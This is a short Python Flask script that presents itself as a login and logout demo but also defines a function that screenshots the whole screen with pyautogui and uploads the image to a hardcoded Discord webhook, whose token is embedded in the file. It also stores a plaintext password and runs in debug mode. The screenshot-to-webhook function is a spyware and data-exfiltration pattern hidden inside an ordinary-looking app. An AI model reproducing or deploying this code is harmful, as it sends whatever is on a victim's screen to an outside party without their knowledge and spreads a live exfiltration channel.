import requests
import pyautogui
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1476746770628477021/QWgTgR-F3sUsocD8s7hywhKL84OtNnm9LiGF5Xgqfe2QVwMcgqm2PO9qO1Na3S_9MI04'

# User login and logout simulation
users = {'body661577-maker': 'password123'}  # Replace with hashed passwords in production
logged_in_users = []

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if username in users and users[username] == password:
        logged_in_users.append(username)
        return jsonify(message='Login successful'), 200
    
    return jsonify(message='Invalid username or password'), 401

@app.route('/logout', methods=['POST'])
def logout():
    data = request.json
    username = data.get('username')
    
    if username in logged_in_users:
        logged_in_users.remove(username)
        return jsonify(message='Logout successful'), 200
    
    return jsonify(message='User not logged in'), 400

# Function to capture screenshot and send to Discord
def capture_and_send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)
    with open(screenshot_path, 'rb') as file:
        requests.post(DISCORD_WEBHOOK, files={'file': file})

if __name__ == '__main__':
    app.run(debug=True)
